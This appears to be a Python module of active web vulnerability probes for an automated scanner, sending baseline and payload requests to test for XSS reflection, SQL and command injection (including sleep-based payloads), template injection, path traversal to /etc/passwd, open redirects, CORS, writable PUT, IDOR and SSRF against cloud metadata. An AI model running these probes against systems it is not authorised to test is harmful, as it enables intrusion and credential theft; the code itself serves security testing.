"""Active vulnerability probes - matched-pair, baseline-diffed checks.

Each probe sends a baseline plus payloads through the guarded client and
returns request_ids plus a structured verdict. A probe never claims a bug;
it reports a signal the agent confirms with its own requests.
"""
from __future__ import annotations

import json as _json
import random
import re
import string
import urllib.parse

from .registry import Context

SQL_ERRORS = re.compile(
    r"sql syntax|mysql|mariadb|sqlite3?|postgresql|pg_query|ORA-\d{4}|"
    r"odbc|jdbc|sqlstate|unclosed quotation|unterminated string|"
    r"syntax error.*sql|warning.*mysql|division by zero.*sql",
    re.I,
)
LFI_MARKERS = re.compile(
    r"root:x:0:0|daemon:|\[fonts\]|\[extensions\]|for 16-bit app support|"
    r"<\?php|BEGIN RSA PRIVATE KEY",
    re.I,
)


def _marker(prefix: str = "arg") -> str:
    return prefix + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def _inject(url: str, param: str, value: str) -> str:
    p = urllib.parse.urlparse(url)
    pairs = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
    if not any(k == param for k, _ in pairs):
        pairs.append((param, ""))
    pairs = [(k, value if k == param else v) for k, v in pairs]
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(pairs)))


def _inject_body(data: str, param: str, value: str) -> str:
    """Replace param's value inside a urlencoded or JSON body template."""
    try:
        obj = _json.loads(data)
        if isinstance(obj, dict):
            obj[param] = value  # append if absent, like the urlencoded path
            return _json.dumps(obj)
    except (ValueError, TypeError):
        pass
    pairs = urllib.parse.parse_qsl(data, keep_blank_values=True)
    if pairs:
        pairs = [(k, value if k == param else v) for k, v in pairs]
        if not any(k == param for k, _ in urllib.parse.parse_qsl(data)):
            pairs.append((param, value))
        return urllib.parse.urlencode(pairs)
    return data


def _send(ctx: Context, url: str, param: str, value: str,
          method: str = "GET", data: str | None = None,
          tool: str = "probe", note: str = ""):
    method = (method or "GET").upper()
    if method == "GET" or data is None:
        return ctx.client.send("GET", _inject(url, param, value), tool=tool, note=note)
    body = _inject_body(data, param, value)
    headers = {"Content-Type": "application/json"} if data.strip().startswith("{") \
        else {"Content-Type": "application/x-www-form-urlencoded"}
    return ctx.client.send(method, url, headers=headers, body=body, tool=tool, note=note)


def _similarity(a: str, b: str) -> float:
    """Cheap length+token similarity in [0,1]; enough for true/false diffs."""
    if a == b:
        return 1.0
    if not a or not b:
        return 0.0
    la, lb = len(a), len(b)
    length_sim = min(la, lb) / max(la, lb)
    ta, tb = set(re.findall(r"\w+", a)), set(re.findall(r"\w+", b))
    tok_sim = len(ta & tb) / max(len(ta | tb), 1)
    return round(0.4 * length_sim + 0.6 * tok_sim, 3)


# ---------------------------------------------------------------------------

def probe_reflection(ctx: Context, url: str, param: str,
                     method: str = "GET", data: str | None = None) -> dict:
    canary = _marker("x")
    payload = f"{canary}<>'\"&=/"
    res = _send(ctx, url, param, payload, method, data, tool="probe_reflection",
                note="xss canary")
    body = res.get("body", "")
    reflected = canary in body
    out = {"request_id": res["request_id"], "reflected": reflected}
    if not reflected:
        out["verdict"] = "not reflected"
        return out
    idx = body.find(canary)
    window = body[max(0, idx - 200): idx + 200]
    surviving = {c: c in window for c in "<>\"'&"}
    ctx_kind = "html"
    if re.search(r'<(?:script|style)[^>]*>[^<]*' + re.escape(canary), window, re.I):
        ctx_kind = "script/style"
    elif re.search(r'=\s*["\']?[^"\']*' + re.escape(canary), window):
        ctx_kind = "attribute"
    out.update({
        "verdict": "reflected",
        "context": ctx_kind,
        "unescaped_chars": [c for c, ok in surviving.items() if ok],
        "excerpt": window,
        "note": "context tells you the payload shape; unescaped < > \" ' means exploitable",
    })
    return out


def probe_sqli(ctx: Context, url: str, param: str, method: str = "GET",
               data: str | None = None, json_body: bool = False) -> dict:
    tool = "probe_sqli"
    base = _send(ctx, url, param, "1", method, data, tool, "baseline")
    quote = _send(ctx, url, param, "1'", method, data, tool, "syntax probe")
    true_r = _send(ctx, url, param, "1' AND '1'='1", method, data, tool, "true")
    false_r = _send(ctx, url, param, "1' AND '1'='2", method, data, tool, "false")

    bodies = {k: r.get("body", "") for k, r in
              (("base", base), ("quote", quote), ("true", true_r), ("false", false_r))}
    error_hits = {k: m.group(0) for k, b in bodies.items()
                  if (m := SQL_ERRORS.search(b))}
    sim = _similarity(bodies["true"], bodies["false"])
    status_diff = true_r["status"] != false_r["status"]

    verdict, signal = "no signal", None
    if error_hits and "quote" in error_hits:
        verdict, signal = "error-based candidate", error_hits.get("quote")
    elif sim < 0.85 or status_diff:
        verdict = "boolean-blind candidate"
        signal = f"true/false similarity={sim}, statuses {true_r['status']}/{false_r['status']}"
    return {
        "verdict": verdict,
        "signal": signal,
        "request_ids": {k: r["request_id"] for k, r in
                        (("base", base), ("quote", quote),
                         ("true", true_r), ("false", false_r))},
        "error_markers": error_hits,
        "true_false_similarity": sim,
        "note": "confirm before record_finding: reproduce the difference and quote the differing bytes",
    }


def probe_time(ctx: Context, url: str, param: str, method: str = "GET",
               data: str | None = None, delay_s: int = 4) -> dict:
    delay_s = max(2, min(int(delay_s or 4), 10))
    tool = "probe_time"
    b1 = _send(ctx, url, param, "1", method, data, tool, "baseline-1")
    b2 = _send(ctx, url, param, "2", method, data, tool, "baseline-2")
    baseline = max(b1["elapsed_ms"], b2["elapsed_ms"])
    threshold = baseline + delay_s * 700  # 70% of requested delay above baseline

    payloads = [
        ("mysql", f"1' AND SLEEP({delay_s})-- -"),
        ("postgres", f"1' AND pg_sleep({delay_s})-- -"),
        ("mssql", f"1'; WAITFOR DELAY '0:0:{delay_s}'-- -"),
        ("cmd-unix", f"1; sleep {delay_s}"),
        ("cmd-pipe", f"1|sleep {delay_s}"),
        ("cmd-subst", f"1$(sleep {delay_s})"),
    ]
    hits, results = [], []
    for family, payload in payloads:
        r = _send(ctx, url, param, payload, method, data, tool, family)
        slow = r["elapsed_ms"] >= threshold
        results.append({"family": family, "elapsed_ms": r["elapsed_ms"],
                        "slow": slow, "request_id": r["request_id"]})
        if slow:
            hits.append(family)
    return {
        "verdict": "time-based candidate: " + ", ".join(hits) if hits else "no delay observed",
        "baseline_ms": baseline,
        "threshold_ms": round(threshold, 1),
        "results": results,
        "note": "repeat a slow family once to rule out noise before recording a finding",
    }


_SSTI_TEMPLATES = [
    ("jinja2/twig", "{{%d+%d}}"),
    ("erb/ejs", "<%%= %d+%d %%>"),
    ("freemarker/velocity", "${%d+%d}"),
    ("thymeleaf/spring", "${{%d+%d}}"),
]


def probe_ssti(ctx: Context, url: str, param: str, method: str = "GET",
               data: str | None = None) -> dict:
    base = _send(ctx, url, param, _marker("s"), method, data, "probe_ssti", "baseline")
    # a random arithmetic sum is virtually never present naturally -
    # the classic "49" from {{7*7}} collides with dates/ids everywhere
    a, b = random.randint(10000, 89999), random.randint(1000, 8999)
    expect = str(a + b)
    hits = []
    for family, tpl in _SSTI_TEMPLATES:
        payload = tpl % (a, b)
        r = _send(ctx, url, param, payload, method, data, "probe_ssti", family)
        body = r.get("body", "")
        if expect in body and payload not in body:
            hits.append({"family": family, "request_id": r["request_id"],
                         "evidence": f"{payload} -> {expect} in response"})
        elif payload in body:
            hits.append({"family": family, "request_id": r["request_id"],
                         "evidence": "reflected unrendered (not SSTI)", "negative": True})
    return {
        "verdict": ("ssti candidate: " + "; ".join(h["evidence"] for h in hits if not h.get("negative")))
        if any(not h.get("negative") for h in hits) else "no template evaluation",
        "baseline_id": base["request_id"],
        "results": hits,
    }


def probe_lfi(ctx: Context, url: str, param: str) -> dict:
    payloads = [
        ("etc-passwd-trav", "../../../../../../etc/passwd"),
        ("etc-passwd-abs", "/etc/passwd"),
        ("etc-passwd-enc", "....//....//....//etc/passwd"),
        ("win-ini", "..\\..\\..\\..\\windows\\win.ini"),
        ("nullbyte", "../../../../../../etc/passwd%00"),
    ]
    hits, results = [], []
    for name, payload in payloads:
        r = _send(ctx, url, param, payload, "GET", None, "probe_lfi", name)
        m = LFI_MARKERS.search(r.get("body", ""))
        results.append({"name": name, "status": r["status"],
                        "request_id": r["request_id"],
                        "marker": m.group(0) if m else None})
        if m:
            hits.append({"name": name, "marker": m.group(0),
                         "request_id": r["request_id"]})
    return {
        "verdict": ("lfi confirmed marker: " + ", ".join(h["marker"] for h in hits))
        if hits else "no file content markers",
        "results": results,
    }


def probe_redirect(ctx: Context, url: str, param: str) -> dict:
    dest = "https://example.org/argus-canary"
    r = _send(ctx, url, param, dest, "GET", None, "probe_redirect", "external dest")
    loc = (r.get("headers") or {}).get("location", "")
    open_r = r["status"] in (301, 302, 303, 307, 308) and "example.org" in loc
    return {
        "verdict": "open redirect" if open_r else "not redirected to external host",
        "request_id": r["request_id"],
        "status": r["status"],
        "location": loc,
    }


def probe_cors(ctx: Context, url: str) -> dict:
    evil = "https://argus-probe.invalid"
    r = ctx.client.send("GET", url, headers={"Origin": evil},
                        tool="probe_cors", note="foreign origin")
    h = {k.lower(): v for k, v in (r.get("headers") or {}).items()}
    acao = h.get("access-control-allow-origin", "")
    acac = h.get("access-control-allow-credentials", "")
    reflected = acao == evil or acao == "*"
    credentialed = acac.lower() == "true"
    verdict = "no cors issue"
    if reflected and credentialed:
        verdict = "arbitrary origin reflection WITH credentials - exploitable"
    elif acao == "*":
        verdict = "wildcard ACAO (no credentials)" if not credentialed else "wildcard + credentials"
    elif reflected:
        verdict = "origin reflected without credentials"
    return {"verdict": verdict, "request_id": r["request_id"],
            "acao": acao, "acac": acac}


def probe_method(ctx: Context, url: str) -> dict:
    r = ctx.client.send("OPTIONS", url, tool="probe_method", note="options")
    h = {k.lower(): v for k, v in (r.get("headers") or {}).items()}
    allow = h.get("allow") or h.get("access-control-allow-methods", "")
    out = {"options_id": r["request_id"], "status": r["status"], "allow": allow}
    dangerous = [m for m in ("PUT", "DELETE", "TRACE", "CONNECT")
                 if m in allow.upper()]
    if "PUT" in allow.upper():
        canary = _marker("put")
        p = ctx.client.send("PUT", url.rstrip("/") + f"/{canary}.txt",
                            body="argus method probe", tool="probe_method",
                            note="PUT canary")
        out["put_attempt"] = {"status": p["status"], "request_id": p["request_id"]}
        if p["status"] in (200, 201, 204):
            g = ctx.client.send("GET", url.rstrip("/") + f"/{canary}.txt",
                                tool="probe_method", note="verify PUT")
            out["put_verified"] = canary in g.get("body", "")
            out["put_verify_id"] = g["request_id"]
            if out["put_verified"]:
                ctx.client.send("DELETE", url.rstrip("/") + f"/{canary}.txt",
                                tool="probe_method", note="cleanup canary")
    out["dangerous_methods"] = dangerous
    out["verdict"] = ("writable method confirmed" if out.get("put_verified")
                      else f"methods: {allow or 'none advertised'}")
    return out


_ID_RE = re.compile(r"(?<![\w.-])(\d{1,12})(?![\w.-])")


def probe_idor(ctx: Context, url: str) -> dict:
    """IDOR matched-pair: fetch the object, then the same URL with the
    numeric id +/-1. A different object at the same access level means
    access control is per-object (or missing)."""
    p = urllib.parse.urlparse(url)
    where, target = "path", p.path
    m = _ID_RE.search(target)
    if not m:
        where, target = "query", p.query
        m = _ID_RE.search(target)
    if not m:
        return {"error": "no numeric id found in url; pass e.g. "
                         "/item?id=7 or /user/42/profile"}
    base = ctx.client.send("GET", url, tool="probe_idor", note="own object")

    def _shift(delta: int) -> dict:
        new_id = str(int(m.group(1)) + delta)
        comp = target[:m.start(1)] + new_id + target[m.end(1):]
        u2 = urllib.parse.urlunparse(
            p._replace(**{where: comp}))
        return ctx.client.send("GET", u2, tool="probe_idor",
                               note=f"id {new_id} (id{delta:+d})")

    neighbors = [_shift(d) for d in (1, -1)]
    results = []
    for r in neighbors:
        other = r.get("body", "")
        sim = _similarity(other, base.get("body", ""))
        results.append({"request_id": r["request_id"], "status": r["status"],
                        "similarity_to_base": sim,
                        "accessible": r["status"] == 200})
    ok = [r for r in results if r["accessible"]]
    verdict = "no other object accessible"
    if ok and all(r["similarity_to_base"] < 0.98 for r in ok):
        verdict = ("idor candidate: neighboring object ids return 200 with "
                   "different content - verify the object isn't yours")
    elif ok:
        verdict = ("neighbors accessible but content ~identical - check "
                   "whether ids even select an object")
    return {"verdict": verdict, "base_id": base["request_id"],
            "results": results,
            "note": "confirm before recording: the second object must belong "
                    "to a different principal (name/id inside the body)"}


_SSRF_MARKERS = re.compile(
    r"ami-id|instance-id|local-hostname|local-ipv4|security-credentials|"
    r"computeMetadata|Metadata-Flavor|XAwsEc2|iam/info",
    re.I,
)


def probe_ssrf(ctx: Context, url: str, param: str) -> dict:
    """SSRF matched-pair: baseline is an unresolvable canary host, then
    internal URLs (self-fetch on the target's own port, loopback name,
    cloud metadata). A 200 whose body differs from the canary error - with
    the injected URL itself stripped out - is the signal."""
    p = urllib.parse.urlparse(url)
    port = p.port or (443 if p.scheme == "https" else 80)
    canary = f"http://{_marker('nrf')}.invalid/"
    base = _send(ctx, url, param, canary, tool="probe_ssrf",
                 note="unresolvable canary")
    base_body = (base.get("body") or "").replace(canary, "")

    payloads = [
        ("self-fetch", f"http://127.0.0.1:{port}/"),
        ("loopback-name", f"http://localhost:{port}/"),
        ("cloud-metadata", "http://169.254.169.254/latest/meta-data/"),
    ]
    hits = []
    for name, target in payloads:
        r = _send(ctx, url, param, target, tool="probe_ssrf", note=name)
        body = r.get("body") or ""
        marker = _SSRF_MARKERS.search(body)
        sim = _similarity(body.replace(target, ""), base_body)
        hits.append({
            "name": name, "target": target, "status": r["status"],
            "request_id": r["request_id"],
            "similarity_to_canary": sim,
            "marker": marker.group(0) if marker else None,
            "differs": sim < 0.75 or r["status"] != base["status"],
        })
    strong = next((h for h in hits if h["marker"]), None)
    cand = next((h for h in hits if h["differs"] and h["status"] == 200), None)
    if strong:
        verdict = ("ssrf candidate: internal-content marker "
                   f"'{strong['marker']}' in response to {strong['name']}")
    elif cand:
        verdict = ("ssrf lead: internal URL returned 200 with different "
                   f"content than the canary ({cand['name']}) - confirm "
                   "the fetched body is really server-side output")
    else:
        verdict = "no ssrf signal"
    return {"verdict": verdict, "canary_id": base["request_id"],
            "results": hits}
